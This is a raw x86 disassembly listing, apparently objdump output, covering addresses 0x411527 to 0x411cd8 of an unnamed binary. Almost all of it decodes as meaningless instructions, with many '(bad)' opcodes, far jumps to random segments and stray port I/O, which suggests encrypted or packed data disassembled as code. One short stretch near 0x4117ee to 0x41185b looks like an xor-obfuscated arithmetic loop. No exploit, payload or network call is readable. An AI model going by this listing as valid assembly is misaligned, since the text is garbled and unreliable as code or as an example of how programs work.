  411527:	push   ecx
  411528:	aam    0x29
  41152a:	mov    dl,al
  41152c:	es lock int 0xe5
  411530:	dec    ebx
  411531:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411532:	mov    ebx,0xd7e54e18
  411537:	pop    ds
  411538:	out    0xcb,al
  41153a:	pop    edx
  41153b:	ret    
  41153c:	loopne 0x4114ec
  41153e:	jnp    0x411585
  411540:	(bad)  
  411541:	(bad)  
  411542:	es das 
  411544:	into   
  411545:	scas   al,BYTE PTR es:[di]
  411547:	dec    esp
  411548:	sbb    ch,bl
  41154a:	ret    0xff66
  41154d:	cmp    bh,0x44
  411550:	scas   eax,DWORD PTR es:[edi]
  411551:	fnstcw WORD PTR [esp+esi*1+0x58fae511]
  411558:	test   al,0x42
  41155a:	rol    DWORD PTR [ecx+0x44],1
  41155d:	or     dl,BYTE PTR [ebp+0x6e]
  411560:	and    eax,0xd72cdd7e
  411565:	mov    bh,0x41
  411567:	dec    ebx
  411568:	sub    eax,0xd084e231
  41156d:	jb     0x4115a1
  41156f:	bound  ecx,QWORD PTR [ebx+0x7b3783c7]
  411575:	fmul   QWORD PTR [esi+0x2eae186f]
  41157b:	pop    es
  41157c:	iret   
  41157d:	popa   
  41157e:	dec    cx
  411580:	out    dx,eax
  411581:	pop    edx
  411582:	ins    DWORD PTR es:[edi],dx
  411583:	rol    ecx,cl
  411585:	in     al,dx
  411586:	cmp    BYTE PTR [edx+0x7bbeb57b],al
  41158c:	sbb    eax,edx
  41158e:	call   0x9d3c:0x38ef66fa
  411595:	inc    ebx
  411596:	std    
  411597:	jo     0x411602
  411599:	jb     0x4115ce
  41159b:	cmp    dh,BYTE PTR [eax]
  41159d:	mov    bh,0x82
  41159f:	cmp    al,0x1c
  4115a1:	nop
  4115a2:	test   DWORD PTR [ebx+0x29],edi
  4115a5:	mov    edi,0x1db8f725
  4115aa:	adc    DWORD PTR [esi+0x1a71acc9],0xffffff8b
  4115b1:	dec    ebx
  4115b2:	mov    dh,0xb4
  4115b4:	push   cs
  4115b5:	add    bl,BYTE PTR [eax+0x2ce3fe53]
  4115bb:	lods   al,BYTE PTR ds:[si]
  4115bd:	pop    esi
  4115be:	lds    ebx,FWORD PTR [eax]
  4115c0:	out    0x98,al
  4115c2:	mov    ebp,0x78daf741
  4115c7:	jg     0x4115d7
  4115c9:	es mov edi,0x4489fa84
  4115cf:	dec    esp
  4115d0:	pop    ebx
  4115d1:	aad    0x6d
  4115d3:	inc    ebp
  4115d4:	cwde   
  4115d5:	and    eax,DWORD PTR [esp+ecx*1+0x69]
  4115d9:	jecxz  0x411589
  4115db:	jnp    0x4115e6
  4115dd:	mov    bh,BYTE PTR [ebp+0x7a2a01d]
  4115e3:	push   cs
  4115e4:	in     eax,dx
  4115e5:	dec    ebx
  4115e6:	mov    gs,WORD PTR [edx]
  4115e8:	inc    esp
  4115e9:	push   ss
  4115ea:	(bad)  
  4115eb:	jmp    0x8d022a1f
  4115f0:	out    dx,al
  4115f1:	jne    0x41161f
  4115f3:	lock int 0x25
  4115f6:	mov    ebx,0x9ed4141d
  4115fb:	sub    eax,0x6bc5a3bb
  411600:	jle    0x4115d6
  411602:	push   edx
  411603:	pop    ss
  411604:	pop    edx
  411605:	(bad)  
  411606:	fst    DWORD PTR [eax]
  411608:	mov    ds:0x8066222,al
  41160d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41160e:	push   esp
  41160f:	mov    eax,0xe8f75a0
  411614:	shr    DWORD PTR [edx-0x7202ed02],1
  41161a:	call   0x3780:0xdd7c000c
  411621:	jg     0x411608
  411623:	cmp    eax,0xbba33cce
  411628:	sub    bh,ch
  41162a:	add    esi,DWORD PTR [ecx-0x6f]
  41162d:	push   eax
  41162e:	or     edx,DWORD PTR [ecx+0x9]
  411631:	shl    edi,0xed
  411634:	sub    al,0xbb
  411636:	into   
  411637:	imul   BYTE PTR [ecx-0x63]
  41163a:	lds    edi,FWORD PTR [eax]
  41163c:	cwde   
  41163d:	imul   edx,ecx,0xbb3bb75
  411643:	adc    ebx,DWORD PTR [edx]
  411645:	mov    bl,0xbb
  411647:	xchg   ebx,eax
  411648:	loope  0x41160d
  41164a:	js     0x411602
  41164c:	cwde   
  41164d:	and    dl,BYTE PTR [ebp-0x2377a2e6]
  411653:	in     al,0x92
  411655:	or     ebp,DWORD PTR [edi+0x6b]
  411658:	popf   
  411659:	mov    dl,0xe4
  41165b:	dec    esi
  41165c:	mov    bl,bl
  41165e:	cdq    
  41165f:	mov    ds:0x74d292f1,eax
  411664:	jno    0x4116ab
  411666:	in     eax,0xbf
  411668:	sar    DWORD PTR [eax],1
  41166a:	data16 shl BYTE PTR [eax],cl
  41166d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41166e:	enter  0x53dc,0x2f
  411672:	adc    bl,BYTE PTR [ebx+0x42]
  411675:	xor    al,0xa0
  411677:	xor    dl,al
  411679:	or     DWORD PTR [ebx-0x56193909],ecx
  41167f:	sub    DWORD PTR [edi+0x21],edx
  411682:	mov    al,0x23
  411684:	pop    ebp
  411685:	into   
  411686:	pusha  
  411687:	nop
  411688:	lahf   
  411689:	xchg   ecx,eax
  41168a:	sbb    esi,DWORD PTR [eax+0x68c81813]
  411690:	(bad)  [ecx-0x5e]
  411693:	pop    edi
  411694:	mov    ecx,0xf8b3210c
  411699:	push   0xffffff83
  41169b:	pop    ebx
  41169c:	loop   0x41164a
  41169e:	cmp    ch,ch
  4116a0:	lahf   
  4116a1:	in     al,dx
  4116a2:	mov    ecx,0xbcb27171
  4116a7:	enter  0x9338,0xa4
  4116ab:	pop    ecx
  4116ac:	xchg   esp,eax
  4116ad:	outs   dx,DWORD PTR ds:[esi]
  4116ae:	push   edx
  4116af:	push   esp
  4116b0:	push   0xa8688b52
  4116b5:	retf   
  4116b6:	inc    DWORD PTR [edx+0x5e]
  4116b9:	lahf   
  4116ba:	fs aaa 
  4116bc:	jmp    0x1f65:0x142a118f
  4116c3:	stc    
  4116c4:	ins    BYTE PTR es:[edi],dx
  4116c5:	inc    ebp
  4116c6:	les    ebx,FWORD PTR [eax]
  4116c8:	outs   dx,DWORD PTR ss:[esi]
  4116ca:	sub    al,0x63
  4116cc:	inc    esp
  4116cd:	add    al,0x10
  4116cf:	inc    ebp
  4116d0:	in     eax,dx
  4116d1:	sbb    DWORD PTR [edx-0x502bbb0a],ebp
  4116d7:	sub    DWORD PTR [ebp+0xd],0xffffffd8
  4116db:	dec    edx
  4116dc:	pop    ds
  4116dd:	cmc    
  4116de:	(bad)  
  4116df:	repz shr DWORD PTR [esi],0xd6
  4116e3:	out    dx,eax
  4116e4:	push   0x20944987
  4116e9:	cmp    ebx,DWORD PTR [edi+0x4c]
  4116ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116ed:	xchg   dl,bh
  4116ef:	inc    ebp
  4116f0:	and    BYTE PTR [ebx-0x6ec9d358],0xd0
  4116f7:	add    DWORD PTR [edx],ebx
  4116f9:	ins    BYTE PTR es:[edi],dx
  4116fa:	mov    ecx,0x2e22cc6e
  4116ff:	fcom   QWORD PTR [esi-0x71]
  411702:	cmp    dl,BYTE PTR [ebx+0x47038be]
  411708:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411709:	mov    edx,0x14ad73a2
  41170e:	ins    BYTE PTR es:[edi],dx
  41170f:	stos   DWORD PTR es:[edi],eax
  411710:	(bad)  
  411711:	pushf  
  411712:	call   FWORD PTR [esi+0x3e74ac01]
  411718:	xor    al,0xca
  41171a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41171b:	inc    esi
  41171c:	jl     0x411779
  41171e:	sbb    DWORD PTR [edx+0x35],ebp
  411721:	mov    dl,0x49
  411723:	or     bh,BYTE PTR [esi-0x2b]
  411726:	mov    DWORD PTR [ebx+0x60],ebx
  411729:	das    
  41172a:	and    DWORD PTR [eax-0x23],edx
  41172d:	lods   al,BYTE PTR ds:[esi]
  41172e:	mov    BYTE PTR [edx+esi*2-0x4c1b6f44],dh
  411735:	repz xlat BYTE PTR ds:[ebx]
  411737:	pop    ebx
  411738:	or     DWORD PTR [ebp+edx*1+0x1b],edx
  41173c:	lock inc esp
  41173e:	jg     0x41172d
  411740:	gs adc eax,0xacbcd442
  411746:	imul   eax,DWORD PTR [ebx+0x14],0x151971c9
  41174d:	scas   eax,DWORD PTR es:[edi]
  41174e:	inc    ebx
  41174f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411750:	jne    0x411702
  411752:	inc    ecx
  411753:	mov    DWORD PTR [edx],eax
  411755:	fsub   QWORD PTR [ebx]
  411757:	mov    dh,0xff
  411759:	jmp    0x411719
  41175b:	ss ins DWORD PTR es:[edi],dx
  41175d:	cmp    ch,BYTE PTR [edx-0x73]
  411760:	sahf   
  411761:	sbb    al,0x14
  411764:	and    ecx,ebp
  411766:	mov    esp,0xa2988671
  41176b:	mov    esp,0x68b9fd5b
  411770:	sub    ebp,DWORD PTR [ebp-0x4b]
  411773:	adc    ah,al
  411775:	or     eax,0xa3634f77
  41177a:	inc    eax
  41177b:	xor    DWORD PTR [edi-0x4b8a7be0],ebx
  411781:	mov    ecx,ds
  411783:	repz jno 0x411731
  411786:	jns    0x411721
  411788:	mov    al,0xe3
  41178a:	cld    
  41178b:	xor    DWORD PTR ds:0x8dd717d5,0xa
  411792:	cdq    
  411793:	xchg   ebx,eax
  411794:	pop    ss
  411795:	mov    bl,0x62
  411797:	or     al,0x0
  411799:	xor    bl,BYTE PTR [ebx+0x68aa840d]
  41179f:	ret    
  4117a0:	loopne 0x411795
  4117a2:	dec    edx
  4117a3:	and    eax,0xc3c4b2df
  4117a8:	push   edx
  4117a9:	push   0xffffffdd
  4117ab:	leave  
  4117ac:	(bad)  [ecx+ebp*2+0x626c8d80]
  4117b3:	ret    
  4117b4:	into   
  4117b5:	arpl   WORD PTR [edi-0x73dcad40],dx
  4117bb:	lods   al,BYTE PTR ds:[esi]
  4117bc:	xor    bl,bh
  4117be:	psubq  mm7,QWORD PTR [eax]
  4117c1:	adc    DWORD PTR [ecx],edi
  4117c3:	push   0x5f
  4117c5:	push   0x462820c8
  4117ca:	push   eax
  4117cb:	cmp    eax,0x43db135c
  4117d0:	mov    WORD PTR [ebx-0x2c54ac6d],?
  4117d6:	fcom   DWORD PTR [ecx-0x5d]
  4117d9:	pushf  
  4117da:	outs   dx,BYTE PTR ds:[esi]
  4117db:	push   0x7
  4117dd:	pop    eax
  4117de:	cs ins DWORD PTR es:[edi],dx
  4117e0:	or     al,0xce
  4117e2:	call   0xadc1c9d1
  4117e7:	in     al,0x2f
  4117e9:	out    0x10,al
  4117eb:	ins    DWORD PTR es:[edi],dx
  4117ec:	push   ebx
  4117ed:	push   es
  4117ee:	sub    ecx,esi
  4117f0:	xor    ecx,eax
  4117f2:	mov    DWORD PTR [ebp+0x8],ecx
  4117f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4117f8:	mov    edx,DWORD PTR [ebp+0x8]
  4117fb:	imul   edx,edx,0x5708f1
  411801:	xor    ecx,eax
  411803:	add    ecx,esi
  411805:	lea    ecx,[ebp+ecx*4-0x64]
  411809:	mov    edi,DWORD PTR [ecx]
  41180b:	add    edx,edi
  41180d:	mov    DWORD PTR [ecx],edx
  41180f:	mov    ecx,DWORD PTR [ebp+0x8]
  411812:	xor    ecx,eax
  411814:	add    ecx,esi
  411816:	jne    0x40f45a
  41181c:	jmp    0x413bef
  411821:	mov    ecx,DWORD PTR [ebp+0x8]
  411824:	mov    edx,DWORD PTR [ebp-0x8]
  411827:	xor    ecx,eax
  411829:	xor    edx,eax
  41182b:	sub    ecx,edx
  41182d:	sub    ecx,esi
  41182f:	xor    ecx,eax
  411831:	mov    DWORD PTR [ebp+0x8],ecx
  411834:	mov    ecx,DWORD PTR [ebp+0x8]
  411837:	mov    edx,DWORD PTR [ebp+0x8]
  41183a:	xor    ecx,eax
  41183c:	imul   edx,edx,0x5708f1
  411842:	add    ecx,esi
  411844:	lea    ecx,[ebp+ecx*4-0x64]
  411848:	mov    edi,DWORD PTR [ecx]
  41184a:	add    edx,edi
  41184c:	mov    DWORD PTR [ecx],edx
  41184e:	mov    ecx,DWORD PTR [ebp+0x8]
  411851:	xor    ecx,eax
  411853:	add    ecx,esi
  411855:	jne    0x411821
  41185b:	jmp    0x413be3
  411860:	ins    BYTE PTR es:[edi],dx
  411861:	jns    0x4117f2
  411863:	sbb    edi,DWORD PTR [ebx+0x1b]
  411866:	mov    eax,0xa6df667b
  41186b:	push   edi
  41186c:	bound  edi,QWORD PTR [edi+edx*1]
  41186f:	out    dx,al
  411870:	call   0x7bd9505
  411875:	pop    edi
  411876:	jl     0x4118f4
  411878:	sahf   
  411879:	or     DWORD PTR [ebx],esp
  41187b:	add    al,BYTE PTR [ebx-0x3e5a21b9]
  411881:	(bad)  
  411882:	fwait
  411883:	push   0xffffffca
  411885:	aas    
  411886:	in     eax,0xc9
  411888:	push   ecx
  411889:	out    0x49,al
  41188b:	cmp    DWORD PTR [edi-0x79],ecx
  41188e:	sub    ecx,DWORD PTR [edx]
  411890:	psubsb mm4,mm0
  411893:	fnsave ds:0x5d1b58d4
  41189a:	xor    eax,DWORD PTR fs:[esi]
  41189d:	call   0x724f:0x287ab40
  4118a4:	and    al,0x78
  4118a6:	(bad)  
  4118a7:	jp     0x4118e2
  4118a9:	xchg   edx,eax
  4118aa:	push   eax
  4118ab:	push   ss
  4118ac:	dec    eax
  4118ad:	retf   
  4118ae:	ds jns 0x411890
  4118b1:	adc    edi,0xffffffdd
  4118b4:	push   ss
  4118b5:	adc    BYTE PTR [edi-0x565ec541],bh
  4118bb:	adc    BYTE PTR [ecx-0x5],0x0
  4118bf:	cmp    BYTE PTR [ecx+esi*2],bl
  4118c2:	ds adc ecx,esi
  4118c5:	push   ebx
  4118c6:	js     0x41186e
  4118c8:	jle    0x411881
  4118ca:	stos   DWORD PTR es:[edi],eax
  4118cb:	sub    ebp,DWORD PTR [eax-0x4cf0f09b]
  4118d1:	sahf   
  4118d2:	repz rol DWORD PTR [esi-0x7a0918de],0x1b
  4118da:	sub    BYTE PTR [eax],cl
  4118dc:	adc    eax,0xb8870b3a
  4118e1:	les    esi,FWORD PTR [edx-0x3b]
  4118e4:	test   bh,0xca
  4118e7:	shl    DWORD PTR [ecx],cl
  4118e9:	fld    st(4)
  4118eb:	sbb    edx,DWORD PTR [ecx+0x4f]
  4118ee:	jecxz  0x4118a1
  4118f0:	push   edi
  4118f1:	outs   dx,BYTE PTR ds:[esi]
  4118f2:	mul    dl
  4118f4:	jg     0x4118e6
  4118f6:	or     ah,BYTE PTR [ebx+0x4cee8207]
  4118fc:	inc    esp
  4118fd:	cwde   
  4118fe:	in     al,0xa0
  411900:	pop    edx
  411901:	rcr    DWORD PTR [esi-0x1d],0xc0
  411905:	xchg   esi,eax
  411906:	fdiv   st,st(2)
  411908:	js     0x41188e
  41190a:	loopne 0x41193e
  41190c:	dec    ecx
  41190d:	loop   0x411937
  41190f:	mov    bl,0x31
  411911:	out    0x46,al
  411913:	ffreep st(2)
  411915:	stos   DWORD PTR es:[edi],eax
  411916:	pop    ebx
  411917:	inc    esp
  411918:	lahf   
  411919:	jle    0x41189f
  41191b:	mov    ds:0x5bb48b81,al
  411920:	out    dx,eax
  411921:	cmp    BYTE PTR [edx],bl
  411923:	jle    0x4118bc
  411925:	clc    
  411926:	jp     0x41199e
  411928:	outs   dx,BYTE PTR ds:[esi]
  411929:	outs   dx,BYTE PTR ds:[esi]
  41192a:	lahf   
  41192b:	ret    
  41192c:	add    BYTE PTR [ebx+ecx*8+0xe1be360],al
  411933:	lock sahf 
  411935:	adc    BYTE PTR [edi-0x98a101c],ah
  41193b:	lds    esi,FWORD PTR [edi+0x63]
  41193e:	xor    esi,DWORD PTR [esi-0x4e]
  411941:	ds cmp eax,0x912a21a1
  411947:	or     edx,DWORD PTR [ecx+ebx*1]
  41194a:	lahf   
  41194b:	(bad)  
  41194c:	dec    esp
  41194d:	pop    ecx
  41194e:	imul   DWORD PTR ds:0x2a869ae2
  411954:	ficom  WORD PTR [edi+0x6d4ee3f9]
  41195a:	ds out dx,eax
  41195c:	not    dl
  41195e:	mov    bl,dl
  411960:	pop    ecx
  411961:	test   eax,0x9a4d51e
  411966:	push   ecx
  411967:	or     edx,DWORD PTR [ecx-0x2fae10cb]
  41196d:	and    al,0xfe
  41196f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411970:	or     BYTE PTR [ecx],al
  411972:	leave  
  411973:	hlt    
  411974:	(bad)  
  411975:	jge    0x41197e
  411977:	mov    edx,0xefaaa886
  41197c:	sub    al,0xd6
  41197e:	sbb    bh,ch
  411980:	pushf  
  411981:	sti    
  411982:	iret   
  411983:	hlt    
  411984:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411985:	push   ebx
  411986:	bnd jmp 0x41a0afc4
  41198c:	out    0xb3,al
  41198e:	mov    cl,ah
  411990:	and    eax,DWORD PTR [ebx-0x79]
  411993:	hlt    
  411994:	je     0x4119e5
  411996:	jl     0x41194f
  411998:	jbe    0x411955
  41199a:	es sbb al,0x90
  41199d:	test   eax,0x1882afca
  4119a2:	jg     0x411984
  4119a4:	fcomp  DWORD PTR [ebp-0x68]
  4119a7:	sub    esi,eax
  4119a9:	es mov ebx,0x59fc233d
  4119af:	and    al,0xa0
  4119b1:	aaa    
  4119b2:	addr16 rcr ah,cl
  4119b5:	neg    dl
  4119b7:	sbb    al,0x12
  4119b9:	sub    BYTE PTR ds:0x6d782617,0xb8
  4119c0:	mov    esp,0x88d39412
  4119c5:	(bad)  
  4119c6:	push   esp
  4119c7:	sub    ah,BYTE PTR [edi-0x1b]
  4119ca:	mov    DWORD PTR [ebx-0x68],edx
  4119cd:	jns    0x411954
  4119cf:	popf   
  4119d0:	jo     0x4119f7
  4119d2:	js     0x411987
  4119d4:	das    
  4119d5:	mov    esi,esi
  4119d7:	(bad)  
  4119d8:	sub    al,0x29
  4119da:	pop    edx
  4119db:	dec    esp
  4119dc:	div    BYTE PTR [esi]
  4119de:	lds    ebp,FWORD PTR [ebp-0xeb7cbc4]
  4119e4:	pop    ecx
  4119e5:	rcl    DWORD PTR [edx-0x7c4c549],1
  4119eb:	mov    eax,ds:0x787d9cd8
  4119f0:	add    DWORD PTR [ecx+0x76],edi
  4119f3:	test   eax,0x30eae2f
  4119f8:	imul   eax,eax,0x72d2c8d9
  4119fe:	xchg   edi,eax
  4119ff:	push   eax
  411a00:	mov    al,ds:0xbe9782a4
  411a05:	lods   eax,DWORD PTR ds:[esi]
  411a06:	lahf   
  411a07:	(bad)  
  411a08:	addr16 std 
  411a0a:	jmp    0xe9d7:0xf33a5b44
  411a11:	mov    WORD PTR [ecx],?
  411a13:	stc    
  411a14:	bound  edi,QWORD PTR [edi-0x5bc128ab]
  411a1a:	xchg   DWORD PTR [esi+eax*4-0x71faf8f],edi
  411a21:	shl    DWORD PTR [ecx],cl
  411a23:	clc    
  411a24:	xor    al,ch
  411a26:	jno    0x411a72
  411a28:	cmp    BYTE PTR ds:0x8d793b4d,0xfb
  411a2f:	out    dx,eax
  411a30:	std    
  411a31:	mov    bh,0x24
  411a33:	ins    DWORD PTR es:[edi],dx
  411a34:	xor    ebx,eax
  411a36:	xchg   edx,eax
  411a37:	push   esi
  411a38:	hlt    
  411a39:	xlat   BYTE PTR ds:[ebx]
  411a3a:	jmp    0xea3bed71
  411a3f:	imul   ecx,DWORD PTR [edi-0x2c],0xfa42ecdb
  411a46:	sar    BYTE PTR [ebx],1
  411a48:	fmul   DWORD PTR [edi-0xd]
  411a4b:	js     0x4119de
  411a4d:	iret   
  411a4e:	add    al,0x23
  411a50:	add    BYTE PTR [edi+0x13e3a5aa],dh
  411a56:	xor    dh,dh
  411a58:	push   edi
  411a59:	mov    WORD PTR [edx],es
  411a5b:	adc    DWORD PTR [eax+0x77dbae87],edx
  411a61:	loope  0x411aaa
  411a63:	mov    ebp,0x582b3c8b
  411a68:	sbb    BYTE PTR [edx+0x65f8f6bf],bh
  411a6e:	cmc    
  411a6f:	push   esp
  411a70:	call   0x14c3:0x526370bc
  411a77:	and    eax,0x27c37ef
  411a7c:	push   es
  411a7d:	inc    ebx
  411a7e:	xchg   DWORD PTR [edi],ecx
  411a80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a81:	shl    edi,0xec
  411a84:	pop    ebx
  411a85:	mov    eax,0x5fd4f794
  411a8a:	aam    0xae
  411a8c:	rcr    ebp,1
  411a8e:	jne    0x411abd
  411a90:	std    
  411a91:	ja     0x411aef
  411a93:	loopne 0x411a46
  411a95:	aam    0x9b
  411a97:	inc    ebp
  411a98:	inc    ecx
  411a99:	mov    DWORD PTR [ecx+0x6a],ebx
  411a9c:	jecxz  0x411a4d
  411a9e:	add    eax,0xdafb62ff
  411aa3:	dec    edi
  411aa4:	dec    edi
  411aa5:	data16 arpl WORD PTR [esi],bp
  411aa8:	cmp    DWORD PTR [ebx-0x31],esi
  411aab:	push   0xb
  411aad:	test   BYTE PTR [ebx-0x69d95455],dh
  411ab3:	and    ch,bh
  411ab5:	imul   eax,DWORD PTR [edi-0x46e949d6],0x16f10acf
  411abf:	test   al,0x6
  411ac1:	fstp   DWORD PTR [esi+0x5d8ad831]
  411ac7:	das    
  411ac8:	xor    cl,BYTE PTR [ebp-0x15dfa1d1]
  411ace:	or     al,0x92
  411ad0:	push   esp
  411ad2:	fwait
  411ad3:	test   edi,esp
  411ad5:	dec    esi
  411ad6:	jnp    0x411ac1
  411ad8:	mov    eax,ds:0x8d4ef6b6
  411add:	xor    al,BYTE PTR [esi]
  411adf:	es inc ebp
  411ae1:	jb     0x411b4a
  411ae3:	xchg   ebp,eax
  411ae4:	fs jmp 0x8b72:0xa3ae3b38
  411aec:	and    al,0xda
  411aee:	jo     0x411a9f
  411af0:	xchg   esp,eax
  411af1:	fldenv [edx-0x12a71233]
  411af7:	jo     0x411b3f
  411af9:	popa   
  411afa:	(bad)  [ebp-0x999859a]
  411b00:	lods   al,BYTE PTR ds:[esi]
  411b01:	leave  
  411b02:	xchg   esi,eax
  411b03:	enter  0xf429,0xb5
  411b07:	jle    0x411b71
  411b09:	adc    DWORD PTR [ebp+0x75],eax
  411b0c:	imul   ebp,DWORD PTR [esi+0x6e0615be],0x0
  411b13:	es rcl ah,0xa6
  411b17:	jmp    0xcd10:0xaf46d4ac
  411b1e:	out    dx,eax
  411b1f:	sub    al,0x69
  411b21:	and    al,0xcf
  411b23:	into   
  411b24:	push   esi
  411b25:	add    BYTE PTR [edi],dl
  411b27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b28:	push   edi
  411b29:	or     eax,DWORD PTR [ebp-0x28]
  411b2c:	add    edx,DWORD PTR [ebx]
  411b2e:	hlt    
  411b2f:	pop    edi
  411b30:	and    cl,BYTE PTR ds:0x776bde4
  411b36:	stc    
  411b37:	sbb    ebx,esi
  411b39:	sub    edx,eax
  411b3b:	add    BYTE PTR [ebx+edx*1-0x3d],ah
  411b3f:	and    eax,0x45f70b98
  411b44:	iret   
  411b45:	mov    DWORD PTR [edx],esi
  411b47:	scas   eax,DWORD PTR es:[edi]
  411b48:	xchg   edi,eax
  411b49:	push   ecx
  411b4a:	dec    esp
  411b4b:	pusha  
  411b4c:	cld    
  411b4d:	jp     0x411b85
  411b4f:	cld    
  411b50:	mov    BYTE PTR ds:0xb696d21a,dl
  411b56:	pop    ebx
  411b57:	lock rcr DWORD PTR [ebx],1
  411b5a:	ret    0xb85
  411b5d:	pop    edx
  411b5e:	lds    edi,FWORD PTR [edi]
  411b60:	push   0xffffffea
  411b62:	push   eax
  411b63:	sbb    eax,0xad998d1d
  411b68:	retf   0x8b71
  411b6b:	repnz lods al,BYTE PTR ds:[esi]
  411b6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b6e:	mov    ebp,0x292b05b8
  411b73:	fwait
  411b74:	sbb    BYTE PTR [esp+ebp*4],ch
  411b77:	rep outs dx,DWORD PTR ds:[esi]
  411b79:	or     eax,0xfd0005fa
  411b7e:	pop    esp
  411b7f:	inc    esp
  411b80:	stc    
  411b81:	sub    edx,DWORD PTR [esi-0x6eae146a]
  411b87:	xchg   ebx,eax
  411b88:	sbb    eax,0x102279de
  411b8d:	mov    dl,BYTE PTR [ebp-0x75]
  411b90:	sbb    BYTE PTR [esi-0x3a6f290e],dl
  411b96:	or     bl,0xcb
  411b99:	mov    al,ds:0xf3f58ae5
  411b9e:	scas   al,BYTE PTR es:[edi]
  411b9f:	push   esi
  411ba0:	or     DWORD PTR [edi],0xeead43ee
  411ba6:	push   eax
  411ba7:	xchg   esi,eax
  411ba9:	inc    edi
  411baa:	xchg   esp,eax
  411bab:	clc    
  411bac:	inc    ebp
  411bad:	sub    al,0x15
  411baf:	das    
  411bb0:	das    
  411bb1:	pusha  
  411bb2:	jge    0x411b61
  411bb4:	(bad)  
  411bb5:	shl    DWORD PTR [edx-0x6c],1
  411bb8:	jge    0x411ba8
  411bba:	inc    esi
  411bbb:	data16 clc 
  411bbd:	inc    di
  411bbf:	mov    dl,0x1f
  411bc1:	pop    ds
  411bc2:	xchg   ebx,eax
  411bc3:	aas    
  411bc4:	dec    esp
  411bc5:	adc    DWORD PTR [edi],eax
  411bc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bc8:	jo     0x411c01
  411bca:	loope  0x411b82
  411bcc:	out    0x48,al
  411bce:	retf   
  411bcf:	ret    0x908
  411bd2:	shl    DWORD PTR [eax],1
  411bd4:	fadd   DWORD PTR [ebx+0x1b]
  411bd7:	sub    al,0x15
  411bd9:	loope  0x411b8a
  411bdb:	mov    WORD PTR [esi],?
  411bdd:	jecxz  0x411c13
  411bdf:	lahf   
  411be0:	pop    ss
  411be1:	xchg   DWORD PTR [ecx-0x51e0ba57],esp
  411be7:	xor    esp,DWORD PTR [ebx+0x43183586]
  411bed:	int3   
  411bee:	das    
  411bef:	leave  
  411bf0:	or     al,0xc
  411bf2:	xchg   ecx,eax
  411bf3:	and    BYTE PTR ds:0x5034d889,dh
  411bf9:	sbb    al,0xcd
  411bfb:	rcr    BYTE PTR ds:0x46c32dcd,0x90
  411c02:	ret    
  411c03:	pop    edi
  411c04:	std    
  411c05:	dec    edx
  411c06:	mov    esi,DWORD PTR [esi]
  411c08:	and    cl,al
  411c0a:	xchg   ebp,eax
  411c0b:	jo     0x411c7e
  411c0d:	addr16 push esi
  411c0f:	sbb    dh,BYTE PTR [ecx]
  411c11:	lock dec edi
  411c13:	push   esp
  411c14:	cdq    
  411c15:	rcr    BYTE PTR [eax-0x9],1
  411c18:	jae    0x411c24
  411c1a:	imul   esp,esi,0xf2e55ea6
  411c20:	pop    esi
  411c21:	jns    0x411ba8
  411c23:	jmp    0x411c07
  411c25:	sbb    al,0x5b
  411c27:	sar    BYTE PTR [esi-0x56],0x47
  411c2b:	sbb    eax,0x8c10ecd2
  411c30:	lods   eax,DWORD PTR ds:[esi]
  411c32:	(bad)  
  411c33:	and    BYTE PTR [eax],0xe6
  411c36:	dec    ecx
  411c37:	add    eax,DWORD PTR [edx+0x16]
  411c3a:	rcl    DWORD PTR [esi+edx*8+0x48e64625],1
  411c41:	test   DWORD PTR [edi+0x14],ebp
  411c44:	es (bad) 
  411c46:	inc    ebp
  411c47:	in     al,dx
  411c48:	idiv   DWORD PTR [eax+0x612691bc]
  411c4e:	mov    ebx,0xc63a8e24
  411c53:	mov    esi,0x6f4d683b
  411c58:	add    al,0x61
  411c5a:	push   ecx
  411c5b:	test   eax,0xcb0c2fe9
  411c60:	mov    al,ds:0x9ee47a6e
  411c65:	mov    ebx,0x18715c8a
  411c6a:	(bad)  
  411c6b:	xchg   ebp,eax
  411c6c:	mov    ch,0xb6
  411c6e:	jecxz  0x411bfd
  411c70:	push   ebx
  411c71:	ret    
  411c72:	es dec ebp
  411c74:	inc    edi
  411c75:	push   eax
  411c76:	mov    bl,0xff
  411c78:	ja     0x411c6d
  411c7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c7b:	sub    bh,bh
  411c7d:	lea    eax,[ecx-0x747eaf0f]
  411c83:	xchg   ebp,eax
  411c84:	mov    eax,0x2f87bd18
  411c89:	jge    0x411ca3
  411c8b:	pop    ss
  411c8c:	mov    bh,0x5e
  411c8e:	mov    cl,0xaf
  411c90:	fidiv  DWORD PTR ds:0xfb1c8849
  411c96:	push   ebx
  411c97:	cmc    
  411c98:	popa   
  411c99:	pop    ecx
  411c9a:	sub    ebx,ecx
  411c9c:	push   eax
  411c9d:	scas   eax,DWORD PTR es:[edi]
  411c9e:	js     0x411c50
  411ca0:	retf   0x8f1f
  411ca3:	xlat   BYTE PTR ds:[ebx]
  411ca4:	fwait
  411ca5:	popa   
  411ca6:	sub    al,0xf7
  411ca8:	fisub  DWORD PTR [edx+0x26]
  411cab:	sub    DWORD PTR [edx+0x558c0f2],ebx
  411cb1:	(bad)  
  411cb2:	pop    edx
  411cb3:	es push 0xffffff98
  411cb6:	outs   dx,BYTE PTR ds:[esi]
  411cb7:	fcmovb st,st(1)
  411cb9:	daa    
  411cba:	popf   
  411cbb:	(bad)  [ecx+0x0]
  411cbe:	loope  0x411c94
  411cc0:	hlt    
  411cc1:	dec    ebx
  411cc2:	inc    esp
  411cc4:	mov    esi,0x81722c0c
  411cc9:	and    ecx,DWORD PTR [ebp+0x6e]
  411ccc:	mov    ecx,0x4125cb5f
  411cd1:	shl    BYTE PTR [esi+0x29286f40],1
  411cd7:	inc    ecx
  411cd8:	sub    DWORD PTR [esi-0xe],esp
